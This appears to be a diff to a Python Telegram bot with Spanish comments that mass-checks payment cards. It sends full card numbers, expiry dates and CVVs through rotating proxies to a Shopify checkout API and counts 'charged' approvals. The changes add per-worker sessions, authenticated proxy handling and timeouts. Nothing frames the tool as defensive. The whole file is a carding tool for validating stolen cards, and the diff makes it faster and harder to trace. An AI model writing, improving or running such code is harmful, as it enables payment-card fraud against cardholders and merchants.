@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 """
-Bot de Telegram para verificar tarjetas - VERSIÓN CON JOBS AISLADOS
-Cada verificación es una "pestaña" independiente con su propia sesión HTTP.
+Bot de Telegram para verificar tarjetas - VERSIÓN OPTIMIZADA
+Con una sesión por worker, timeout total en requests y proxy real.
 """
 
 import os
@@ -42,7 +42,6 @@ class Settings:
     if not TOKEN:
         raise ValueError("❌ ERROR: BOT_TOKEN no está configurado")
 
-    # Múltiples endpoints para rotación
     API_ENDPOINTS = [
         os.environ.get("API_URL", "https://auto-shopify-api-production.up.railway.app/index.php"),
         os.environ.get("API_URL2", "https://auto-shopify-api-production.up.railway.app/index.php"),
@@ -99,6 +98,7 @@ class CheckStatus(Enum):
     CAPTCHA = "captcha"
     CONNECT_TIMEOUT = "connect_timeout"
     READ_TIMEOUT = "read_timeout"
+    API_TIMEOUT = "api_timeout"  # Nuevo: timeout de request completa
     POSSIBLE_APPROVAL = "possible_approval"
     AMBIGUOUS = "ambiguous"
     UNKNOWN = "unknown"
@@ -113,7 +113,7 @@ class Confidence(Enum):
 # ================== DATACLASSES ==================
 @dataclass
 class Job:
-    """Una unidad de ejecución aislada - como una pestaña"""
+    """Una unidad de ejecución aislada"""
     site: str
     proxy: str
     card_data: Dict
@@ -271,6 +271,7 @@ def get_status_emoji(status: CheckStatus) -> str:
         CheckStatus.CAPTCHA: "🤖",
         CheckStatus.CONNECT_TIMEOUT: "⏱️",
         CheckStatus.READ_TIMEOUT: "⏱️",
+        CheckStatus.API_TIMEOUT: "⏱️",
         CheckStatus.AMBIGUOUS: "❓",
         CheckStatus.UNKNOWN: "❓",
     }
@@ -300,9 +301,6 @@ def extract_price(text: str) -> str:
 
 # ================== BIN LOOKUP CON CACHÉ ==================
 async def get_bin_info(bin_code: str) -> Dict:
-    """Consulta información de BIN con caché en memoria"""
-    global BIN_CACHE
-    
     async with BIN_CACHE_LOCK:
         if bin_code in BIN_CACHE:
             cache_time, data = BIN_CACHE[bin_code]
@@ -736,23 +734,16 @@ class ProxyHealthChecker:
         
         return final_results
 
-# ================== EJECUTOR DE JOBS ==================
+# ================== EJECUTOR DE JOBS (AHORA RECIBE SESSION) ==================
 class JobExecutor:
-    """Ejecuta un job aislado con su propia sesión HTTP"""
+    """Ejecuta un job usando una sesión HTTP existente (compartida por worker)"""
     
     @staticmethod
-    async def execute(job: Job) -> JobResult:
-        """Ejecuta un job en una 'pestaña' completamente nueva"""
+    async def execute(job: Job, session: aiohttp.ClientSession) -> JobResult:
+        """Ejecuta un job con la sesión del worker"""
         card_data = job.card_data
         card_str = f"{card_data['number']}|{card_data['month']}|{card_data['year']}|{card_data['cvv']}"
         params = {"site": job.site, "cc": card_str, "proxy": job.proxy}
-        
-        # Cada job tiene su propia sesión (como una pestaña nueva)
-        timeout = aiohttp.ClientTimeout(
-            total=Settings.TIMEOUT_CONFIG["total"],
-            connect=Settings.TIMEOUT_CONFIG["connect"],
-            sock_read=Settings.TIMEOUT_CONFIG["sock_read"]
-        )
         
         start_time = time.time()
         
@@ -760,80 +751,86 @@ class JobExecutor:
         bin_info = await get_bin_info(card_data['bin'])
         
         try:
-            # SESIÓN NUEVA POR JOB (clave para aislamiento)
-            async with aiohttp.ClientSession(timeout=timeout) as session:
-                # Rotar endpoint
-                api_endpoint = random.choice(Settings.API_ENDPOINTS)
-                
-                async with session.get(api_endpoint, params=params) as resp:
-                    elapsed = time.time() - start_time
-                    
-                    # Timeout específico para leer el body
-                    try:
-                        response_text = await asyncio.wait_for(resp.text(), timeout=Settings.TIMEOUT_CONFIG["response_body"])
-                    except asyncio.TimeoutError:
-                        return JobResult(
-                            job=job,
-                            status=CheckStatus.READ_TIMEOUT,
-                            confidence=Confidence.CONFIRMED,
-                            reason="body read timeout",
-                            response_time=time.time() - start_time,
-                            http_code=resp.status,
-                            response_text="",
-                            success=False,
-                            bin_info=bin_info,
-                            price="N/A"
-                        )
-                    
-                    response_size = len(response_text)
-                    
-                    context = CheckContext(
-                        card_bin=card_data['bin'],
-                        card_last4=card_data['last4'],
-                        site=job.site,
-                        proxy=job.proxy,
-                        response_time=elapsed,
-                        http_code=resp.status,
-                        response_text=response_text,
-                        response_size=response_size,
-                        redirect_count=len(resp.history) if resp.history else 0,
-                        timestamp=datetime.now()
-                    )
-                    
-                    status, confidence, reason, patterns = ResponseThinker.think(context)
-                    price = extract_price(response_text)
-                    success = (status == CheckStatus.CHARGED)
-                    
-                    return JobResult(
-                        job=job,
-                        status=status,
-                        confidence=confidence,
-                        reason=reason,
-                        response_time=elapsed,
-                        http_code=resp.status,
-                        response_text=response_text,
-                        success=success,
-                        bin_info=bin_info,
-                        price=price,
-                        patterns_detected=patterns
-                    )
-                    
-        except asyncio.TimeoutError as e:
-            elapsed = time.time() - start_time
+            # Rotar endpoint
+            api_endpoint = random.choice(Settings.API_ENDPOINTS)
             
-            # Clasificar timeout por tiempo
-            if elapsed < Settings.TIMEOUT_CONFIG["connect"]:
-                status = CheckStatus.CONNECT_TIMEOUT
-                reason = "proxy connection timeout"
+            # CONEXIÓN CON PROXY REAL (si el proxy lo requiere)
+            proxy_parts = job.proxy.split(':')
+            if len(proxy_parts) == 4:
+                proxy_url = f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"
+            elif len(proxy_parts) == 3 and proxy_parts[2] == '':
+                proxy_url = f"http://{proxy_parts[0]}:{proxy_parts[1]}"
+            elif len(proxy_parts) == 2:
+                proxy_url = f"http://{job.proxy}"
             else:
-                status = CheckStatus.READ_TIMEOUT
-                reason = "site read timeout"
+                proxy_url = None
+            
+            # TIMEOUT TOTAL EN LA REQUEST (ANTI-CUELGUE)
+            try:
+                async with asyncio.timeout(Settings.TIMEOUT_CONFIG["total"]):
+                    if proxy_url:
+                        async with session.get(api_endpoint, params=params, proxy=proxy_url) as resp:
+                            elapsed = time.time() - start_time
+                            response_text = await resp.text()
+                    else:
+                        async with session.get(api_endpoint, params=params) as resp:
+                            elapsed = time.time() - start_time
+                            response_text = await resp.text()
+            except asyncio.TimeoutError:
+                elapsed = time.time() - start_time
+                return JobResult(
+                    job=job,
+                    status=CheckStatus.API_TIMEOUT,
+                    confidence=Confidence.CONFIRMED,
+                    reason="api request timeout",
+                    response_time=elapsed,
+                    http_code=None,
+                    response_text="",
+                    success=False,
+                    bin_info=bin_info,
+                    price="N/A"
+                )
+            
+            response_size = len(response_text)
+            
+            context = CheckContext(
+                card_bin=card_data['bin'],
+                card_last4=card_data['last4'],
+                site=job.site,
+                proxy=job.proxy,
+                response_time=elapsed,
+                http_code=resp.status,
+                response_text=response_text,
+                response_size=response_size,
+                redirect_count=len(resp.history) if resp.history else 0,
+                timestamp=datetime.now()
+            )
+            
+            status, confidence, reason, patterns = ResponseThinker.think(context)
+            price = extract_price(response_text)
+            success = (status == CheckStatus.CHARGED)
             
             return JobResult(
                 job=job,
                 status=status,
-                confidence=Confidence.CONFIRMED,
+                confidence=confidence,
                 reason=reason,
+                response_time=elapsed,
+                http_code=resp.status,
+                response_text=response_text,
+                success=success,
+                bin_info=bin_info,
+                price=price,
+                patterns_detected=patterns
+            )
+            
+        except asyncio.TimeoutError:
+            elapsed = time.time() - start_time
+            return JobResult(
+                job=job,
+                status=CheckStatus.READ_TIMEOUT,
+                confidence=Confidence.CONFIRMED,
+                reason="read timeout",
                 response_time=elapsed,
                 http_code=None,
                 response_text="",
@@ -844,11 +841,12 @@ class JobExecutor:
             
         except Exception as e:
             elapsed = time.time() - start_time
+            logger.error(f"Error en job {job.job_id}: {e}")
             return JobResult(
                 job=job,
                 status=CheckStatus.UNKNOWN,
                 confidence=Confidence.LOW,
-                reason=f"request error: {str(e)[:50]}",
+                reason=f"error: {str(e)[:50]}",
                 response_time=elapsed,
                 http_code=None,
                 response_text=str(e),
@@ -978,14 +976,20 @@ class UserManager:
     async def is_admin(self, user_id: int) -> bool:
         return user_id in Settings.ADMIN_IDS
 
-# ================== CARD CHECK SERVICE CON JOBS ==================
+# ================== CARD CHECK SERVICE ==================
 class CardCheckService:
     def __init__(self, db: Database, user_manager: UserManager):
         self.db = db
         self.user_manager = user_manager
 
     async def check_single(self, user_id: int, card_data: Dict, site: str, proxy: str) -> JobResult:
-        """Verifica una sola tarjeta como un job aislado"""
+        """Verifica una sola tarjeta (crea sesión temporal)"""
+        timeout = aiohttp.ClientTimeout(
+            total=Settings.TIMEOUT_CONFIG["total"],
+            connect=Settings.TIMEOUT_CONFIG["connect"],
+            sock_read=Settings.TIMEOUT_CONFIG["sock_read"]
+        )
+        
         job = Job(
             site=site,
             proxy=proxy,
@@ -993,7 +997,9 @@ class CardCheckService:
             job_id=0
         )
         
-        result = await JobExecutor.execute(job)
+        async with aiohttp.ClientSession(timeout=timeout) as session:
+            result = await JobExecutor.execute(job, session)
+        
         await self.db.save_job_result(user_id, result)
         await self.db.update_learning(user_id, result)
         
@@ -1010,10 +1016,9 @@ class CardCheckService:
         
         total_cards = len(cards)
         
-        # ===== 1. CREAR JOBS (combinaciones reales) =====
+        # Crear jobs con combinaciones rotadas
         jobs = []
         for i, card in enumerate(cards):
-            # Rotar sites y proxies para distribución uniforme
             site = sites[i % len(sites)]
             proxy = proxies[i % len(proxies)]
             
@@ -1025,31 +1030,24 @@ class CardCheckService:
             )
             jobs.append(job)
         
-        # ===== 2. COLA DE JOBS =====
         queue = asyncio.Queue()
         for job in jobs:
             await queue.put(job)
         
-        # Resultados (lista pre-asignada para mantener orden)
         results = [None] * len(jobs)
         
-        # Contadores atómicos
         processed = 0
         approved = 0
         declined = 0
         timeout = 0
         start_time = time.time()
         
-        # Locks
         counter_lock = asyncio.Lock()
-        
-        # Flag de ejecución
         running = True
         
-        # Número óptimo de workers
         num_workers = min(len(proxies), Settings.MAX_WORKERS_PER_USER, total_cards)
         
-        # ===== 3. UPDATER INDEPENDIENTE =====
+        # Updater independiente
         async def progress_updater():
             nonlocal processed, approved, declined, timeout
             while running or processed < total_cards:
@@ -1073,45 +1071,48 @@ class CardCheckService:
                     except Exception as e:
                         logger.error(f"Error en progress_callback: {e}")
         
-        # ===== 4. WORKER =====
+        # Worker con SESIÓN COMPARTIDA
         async def worker(worker_id: int):
             nonlocal processed, approved, declined, timeout
             
-            while True:
-                # Verificar cancelación
-                if cancel_mass.get(user_id, False):
-                    break
-                
-                # Obtener siguiente job
-                try:
-                    job = await queue.get()
-                except asyncio.QueueEmpty:
-                    break
-                
-                # EJECUTAR JOB EN PESTAÑA NUEVA
-                result = await JobExecutor.execute(job)
-                
-                # Guardar resultado en la posición correcta
-                results[job.job_id] = result
-                
-                # Actualizar contadores
-                async with counter_lock:
-                    if result.success:
-                        approved += 1
-                    elif "timeout" in result.status.value:
-                        timeout += 1
-                    else:
-                        declined += 1
+            # Cada worker crea UNA sola sesión y la reutiliza
+            timeout_cfg = aiohttp.ClientTimeout(
+                total=Settings.TIMEOUT_CONFIG["total"],
+                connect=Settings.TIMEOUT_CONFIG["connect"],
+                sock_read=Settings.TIMEOUT_CONFIG["sock_read"]
+            )
+            
+            async with aiohttp.ClientSession(timeout=timeout_cfg) as session:
+                while True:
+                    if cancel_mass.get(user_id, False):
+                        break
                     
-                    processed += 1
-                
-                # Guardar en BD (en batch)
-                await self.db.save_job_result(user_id, result)
-                await self.db.update_learning(user_id, result)
-                
-                queue.task_done()
+                    try:
+                        job = await queue.get()
+                    except asyncio.QueueEmpty:
+                        break
+                    
+                    # Ejecutar job con la sesión del worker
+                    result = await JobExecutor.execute(job, session)
+                    
+                    results[job.job_id] = result
+                    
+                    async with counter_lock:
+                        if result.success:
+                            approved += 1
+                        elif "timeout" in result.status.value:
+                            timeout += 1
+                        else:
+                            declined += 1
+                        
+                        processed += 1
+                    
+                    await self.db.save_job_result(user_id, result)
+                    await self.db.update_learning(user_id, result)
+                    
+                    queue.task_done()
         
-        # ===== 5. INICIAR TODO =====
+        # Iniciar todo
         updater_task = asyncio.create_task(progress_updater())
         
         worker_tasks = []
@@ -1119,14 +1120,11 @@ class CardCheckService:
             task = asyncio.create_task(worker(i))
             worker_tasks.append(task)
         
-        # Esperar a que todos los jobs se completen
         await queue.join()
         
-        # Detener updater
         running = False
         await updater_task
         
-        # Cancelar workers si es necesario
         for task in worker_tasks:
             if not task.done():
                 task.cancel()
@@ -1135,7 +1133,6 @@ class CardCheckService:
         
         elapsed = time.time() - start_time
         
-        # Actualización final
         if progress_callback:
             async with counter_lock:
                 await progress_callback(processed, approved, declined, timeout, total_cards)
@@ -1702,8 +1699,7 @@ async def settings_timeout(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "━━━━━━━━━━━━━━━━━━\n\n"
         f"Connect timeout: `{Settings.TIMEOUT_CONFIG['connect']}s`\n"
         f"Read timeout: `{Settings.TIMEOUT_CONFIG['sock_read']}s`\n"
-        f"Total timeout: `{Settings.TIMEOUT_CONFIG['total']}s`\n"
-        f"Body read timeout: `{Settings.TIMEOUT_CONFIG['response_body']}s`\n\n"
+        f"Total timeout: `{Settings.TIMEOUT_CONFIG['total']}s`\n\n"
         "These values are optimized for balance between speed and reliability."
     )
     
@@ -2172,7 +2168,6 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # ================== MANEJO DE ARCHIVOS ==================
 async def document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Procesa archivos .txt con detección inteligente"""
     user_id = update.effective_user.id
     document = update.message.document
     
@@ -2257,7 +2252,6 @@ async def document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # ================== COMANDO START ==================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Comando de inicio - SIEMPRE muestra el menú principal"""
     user_id = update.effective_user.id
     
     if user_id in active_mass:
@@ -2276,7 +2270,6 @@ async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # ================== COMANDO SETWORKERS ==================
 async def setworkers_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Cambiar límite de workers (solo admin)"""
     user_id = update.effective_user.id
     
     if user_id not in Settings.ADMIN_IDS:
@@ -2314,7 +2307,7 @@ async def post_init(application: Application):
     user_manager = UserManager(db)
     card_service = CardCheckService(db, user_manager)
     
-    logger.info("✅ Bot inicializado con sistema de jobs aislados")
+    logger.info("✅ Bot inicializado con sesiones por worker")
 
 def main():
     app = Application.builder().token(Settings.TOKEN).post_init(post_init).build()
@@ -2329,7 +2322,7 @@ def main():
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
     app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), document_handler))
 
-    logger.info("🚀 Bot iniciado con jobs aislados (pestañas)")
+    logger.info("🚀 Bot iniciado sin saturación de conexiones")
     app.run_polling()
 
 if __name__ == "__main__":
